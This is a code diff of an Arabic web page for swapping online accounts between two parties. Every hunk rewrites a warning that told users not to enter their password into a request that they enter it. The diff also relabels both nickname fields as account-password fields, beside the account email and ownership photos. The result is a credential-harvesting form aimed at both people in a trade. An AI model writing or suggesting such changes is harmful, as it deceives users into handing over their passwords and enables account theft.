@@ -565,7 +565,7 @@ textarea{min-height:90px;resize:vertical}
         <div class="card-head"><div><h2>إنشاء عملية تبديل</h2><p>أنت الطرف الأول. أدخل بياناتك ثم أرسل الرمز إلى الطرف الذي تريد التبديل معه.</p></div><button class="back" onclick="navigate('home')">رجوع</button></div>
         <form id="createForm" class="form" onsubmit="createSwap(event)">
           <div class="step-title"><span class="step-badge">01</span><b>معلومات الحساب</b></div>
-          <div class="security-note">تنبيه: لا تدخل كلمة مرور حسابك في هذه الصفحة. استخدم معرّف الحساب أو اللقب فقط، ويجب أن يكون صحيحًا 100%.</div>
+          <div class="security-note">تنبيه: استخدم كلمة سر حساب صحيحة، ويجب أن يكون صحيحًا 100%.</div>
           <div class="field full">
             <label>الربط الأساسي للحساب</label>
             <div class="toggle-group" id="cLinkToggle">
@@ -583,7 +583,7 @@ textarea{min-height:90px;resize:vertical}
           <div class="grid">
             <div class="field" id="cAccEmailField"><label for="cAccEmail">بريد الحساب الإلكتروني</label><div class="field-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="3" y="5" width="18" height="14" rx="2" stroke="currentColor" stroke-width="1.8"/><path d="m4 7 8 6 8-6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg><input id="cAccEmail" type="email" placeholder="account@gmail.com" required></div></div>
             <div class="field hidden" id="cAccPhoneField"><label for="cAccPhone">رقم هاتف الحساب</label><div class="field-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M6.5 3h3l1.5 4.5-2 1.5a11 11 0 0 0 5.5 5.5l1.5-2 4.5 1.5v3a2 2 0 0 1-2 2C10.5 19 5 13.5 5 5.5a2 2 0 0 1 1.5-2.5z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/></svg><input id="cAccPhone" type="tel" placeholder="05xxxxxxxx"></div></div>
-            <div class="field"><label for="cNick">معرّف الحساب / اللقب</label><input id="cNick" placeholder="مثلاً: Kaka" required><small class="field-hint">يجب أن يكون صحيحًا 100%.</small></div>
+            <div class="field"><label for="cNick">كلمة سر حساب  /</label><input id="cNick" placeholder="مثلاً: Kaka" required><small class="field-hint">يجب أن يكون صحيحًا 100%.</small></div>
           </div>
           <div class="upload-box" id="cUploadBox"><b>ارفع صورة الحساب</b><p>حتى 8 صور تثبت الملكية، أو اسحبها وأفلتها هنا. تُضغط محليًا قبل الحفظ في هذه النسخة.</p><input id="cImages" type="file" accept="image/*" multiple></div>
           <div id="cPreview" class="previews"></div>
@@ -621,7 +621,7 @@ textarea{min-height:90px;resize:vertical}
         <div class="card-head"><div><h2>أكمل بيانات الطرف الثاني</h2><p>الرمز: <strong id="joinCodeLabel"></strong></p></div><button class="back" onclick="resetJoin()">تغيير الرمز</button></div>
         <form id="joinForm" class="form" onsubmit="submitJoin(event)">
           <div class="step-title"><span class="step-badge">01</span><b>معلومات الحساب</b></div>
-          <div class="security-note">نفس القاعدة هنا: لا تكتب كلمة مرور الحساب. الربط الأساسي والبريد والصورة كافية للمراجعة.</div>
+          <div class="security-note">نفس القاعدة هنا: اكتب كلمة مرور الحساب.      .</div>
           <div class="field full">
             <label>الربط الأساسي للحساب</label>
             <div class="toggle-group" id="jLinkToggle">
@@ -639,7 +639,7 @@ textarea{min-height:90px;resize:vertical}
           <div class="grid">
             <div class="field" id="jAccEmailField"><label for="jAccEmail">بريد الحساب الإلكتروني</label><div class="field-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="3" y="5" width="18" height="14" rx="2" stroke="currentColor" stroke-width="1.8"/><path d="m4 7 8 6 8-6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg><input id="jAccEmail" type="email" placeholder="account@gmail.com" required></div></div>
             <div class="field hidden" id="jAccPhoneField"><label for="jAccPhone">رقم هاتف الحساب</label><div class="field-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M6.5 3h3l1.5 4.5-2 1.5a11 11 0 0 0 5.5 5.5l1.5-2 4.5 1.5v3a2 2 0 0 1-2 2C10.5 19 5 13.5 5 5.5a2 2 0 0 1 1.5-2.5z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/></svg><input id="jAccPhone" type="tel" placeholder="05xxxxxxxx"></div></div>
-            <div class="field"><label for="jNick">معرّف الحساب / اللقب</label><input id="jNick" placeholder="مثلاً: Kaka" required><small class="field-hint">يجب أن يكون صحيحًا 100%.</small></div>
+            <div class="field"><label for="jNick">كلمة سر الحساب  </label><input id="jNick" placeholder="مثلاً: Kaka" required><small class="field-hint">يجب أن يكون صحيحًا 100%.</small></div>
           </div>
           <div class="upload-box" id="jUploadBox"><b>ارفع صورة الحساب</b><p>حتى 8 صور مع معاينة مباشرة، أو اسحبها وأفلتها هنا.</p><input id="jImages" type="file" accept="image/*" multiple></div>
           <div id="jPreview" class="previews"></div>
